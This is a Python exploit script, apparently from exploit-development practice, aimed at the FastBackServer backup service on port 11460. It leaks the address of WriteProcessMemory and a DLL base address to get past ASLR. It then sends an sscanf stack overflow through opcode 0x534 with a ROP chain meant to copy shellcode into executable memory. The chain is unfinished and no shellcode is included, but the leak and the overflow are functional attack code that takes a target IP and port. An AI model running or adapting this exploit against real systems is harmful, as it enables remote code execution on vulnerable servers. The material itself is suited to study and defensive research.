#!/usr/bin/python

import socket
import sys
from struct import pack

# Buffer overflow sscanf call: FastBackServer!FXCLI_SetConfFileChunk+0x40

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# max packet length = 0x4400
# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20

alloc_func = "WriteProcessMemory"
dll_func = "N98E_CRYPTO_get_new_lockid"
dll_func_offset = 0x14e0
bad_chars = [0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]


def main():

    # parse args and set socket params
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)
    server = sys.argv[1]
    port = int(sys.argv[2])


    ### INFO LEAKS BUFFER SEND ###
    # create a connection and leak the alloc function (WPM) address
    print("[+] Getting", alloc_func, "base address...")
    buffer = info_leak_evil_buffer(alloc_func)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    # receive leaked address from application
    response = s.recv(1024)
    wpm_addr = parse_response(response)
    if not wpm_addr: return
    print("[+] Address is:", hex(wpm_addr))
    s.close()   
    
    # create a connection and leak the dll base (libeay32ibm019) address
    print("[+] Getting", dll_func, "base address...")
    buffer = info_leak_evil_buffer(dll_func)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    # receive leaked address from application
    response = s.recv(1024)
    dll_addr = parse_response(response)
    if not dll_addr: return
    dll_addr = dll_addr - dll_func_offset
    print("[+] Address is: ", hex(dll_addr))
    s.close()


    ### EXPLOITATION BUFFER SEND ###
    input("[?] ENTER to exploit...")
    # create another connection, use leaked base address to get RCE
    print("[+] Exploiting binary...")
    buffer = exploit_evil_buffer(wpm_addr, dll_addr)
    print("\n<<BUFFER>>\n", buffer)
    input("[?] ENTER to exploit 2!...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    s.close()

    sys.exit(0)



# exploits FastBack opcode function 0x2000 to "debug" the address of an arbitrary module
def info_leak_evil_buffer(symbol_name):
    # psAgentCommand
    buf = bytearray([0x41]*0x0C) # ??
    buf += pack('<i', 0x2000) # Opcode for execution path
    buf += pack('<i', 0x0) # offset 1
    buf += pack('<i', 0x100) # size 1
    buf += pack('<i', 0x100) # offset 2
    buf += pack('<i', 0x100) # size 2
    buf += pack('<i', 0x200) # offset 3
    buf += pack('<i', 0x100) # size 3
    buf += bytearray([0x41]*0x8) # ??
    
    # psCommandBuffer
    buf += b'SymbolOperation'
    sym_op = str.encode(symbol_name)
    buf += sym_op + b'\x00' + bytearray([0x42]*(0x100 - len(sym_op))) # buffer 1
    buf += bytearray([0x43]*0x100) # buffer 2
    buf += bytearray([0x44]*0x100) # buffer 3
    
    # prepend buffer length for the checksum
    buf = pack('>i', len(buf)-4) + buf
    return buf



# exploits FastBack opcode 0x534, a string with unchecked length is used in a sscanf call 
# storing  the first parsed string on stack
def exploit_evil_buffer(wpm_addr, base):

    # psAgentCommand
    buf =  bytearray([0x41]*0x0C) # ??
    buf += pack('<i', 0x0534) # Opcode for execution path
    buf += pack('<i', 0x0) # offset 1
    buf += pack('<i', 0x1000) # size 1
    buf += pack('<i', 0x100) # offset 2
    buf += pack('<i', 0x100) # size 2
    buf += pack('<i', 0x200) # offset 3
    buf += pack('<i', 0x100) # size 3
    buf += bytearray([0x41]*0x8) # ??
    
    # psCommandBuffer
    wpm =  pack('<L', wpm_addr) # WriteProcessMemory address (return to)
    wpm += pack('<L', base+0x000926cc) # executable shellcode address (return to)
    wpm += pack('<L', 0xffffffff) # hProcess, -1 = self
    wpm += pack('<L', base+0x000926cc) # lpBaseAddress, write to address (code cave) *mangled
    wpm += pack('<L', 0x61616161) # lpBuffer, write from address (stack shellcode) *mangled
    wpm += pack('<L', 0x62626262) # nSize, 400 write size *mangled
    wpm += pack('<L', base+0x000e1e98) # [out] *lpNumberOfBytesWritten, bytes written output

    # offset until return address overwrite (with consideration for WPM skeleton length)
    offset = bytearray([0x42]*(276-len(wpm)))

    # bad_chars = [0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]

    ### [ ] ALIGN EAX TO WPM SKELETON ###
    rop  = pack('<L', base+0x000408d6) # push esp ; pop esi ; ret
    rop += pack('<L', base+0x00002541) # mov eax, esi ; pop esi ; ret
    rop += pack('<L', 0x41414141) # junk
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', 0xffffffec) # -0x14
    rop += pack('<L', base+0x0001d0f0) # add eax, ecx ; ret
    ### [X] ALIGN EAX TO WPM SKELETON ###


    ### [ ] PATCH lpBaseAddress ###
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', base+0x000926cc) # lpBaseAddress, write to address (code cave)
    rop += pack('<L', base+0x00001f7e) # mov [eax], ecx ; ret 
    ### [X] PATCH lpBaseAddress ###


    ### [ ] PATCH lpBuffer ###
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    ### [X] PATCH lpBuffer ###


    ### [ ] PATCH nSize ###
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret ;
    ### [X] PATCH nSize ###


    #rop += pack('<L', base+
    #rop += pack('<L', base+
    #rop += pack('<L', base+
    
    print("WPM BAD CHAR SCAN:\n", wpm)
    scan_buffer_bad_chars(wpm)
    print("ROP BAD CHAR SCAN:\n", rop)
    scan_buffer_bad_chars(rop)

    # base + 0x000926cc
    # format string of first buffer, expected input with overflow parameter
    buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(offset+wpm+rop,0,0,0,0)
    buf += bytearray([0x43]*0x100) # buffer 2
    buf += bytearray([0x44]*0x100) # buffer 3
    
    # prepend buffer length for the checksum
    buf = pack('>i', len(buf)-4) + buf
    return buf



def parse_response(response):

    pattern = b"Address is: "
    offset = response.find(pattern)
    if offset == -1:
        print("[!] Expected pattern not found in response:", response)
        return None
    addr_start = offset + len(pattern)
    response = response[addr_start:addr_start+10]
    return int(response,16)



def scan_buffer_bad_chars(buffer):

    for i in range(len(buffer)-1):
        for j in range(len(bad_chars)):
            if bad_chars[j] == buffer[i]:
                print(f"[!] Bad char \'{hex(bad_chars[j])}\' at offset {i}")



if __name__ == "__main__":
    main()
